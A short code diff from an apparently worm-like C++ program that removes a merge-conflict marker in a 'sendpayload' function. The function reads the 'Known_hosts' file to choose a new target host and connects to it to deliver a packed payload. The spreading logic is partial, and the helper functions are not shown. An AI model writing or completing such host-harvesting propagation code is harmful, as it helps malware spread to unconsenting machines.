@@ -93,7 +93,6 @@ void addpayload(string pathpacked, string pathstaging) {
 
 void sendpayload(string pathpacked) {
 	//ToDo logic to select server here <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-<<<<<<< HEAD
 	vector<string> target;
 	target = findnew("Known_hosts");
 	string host = target[0];
@@ -102,5 +101,6 @@ void sendpayload(string pathpacked) {
 	strcpy(ip2, ip.c_str());
 	char host2[host.size()+1];
 	strcpy(host2, host.c_str());
+
 	connect(ip2, host2);
 }
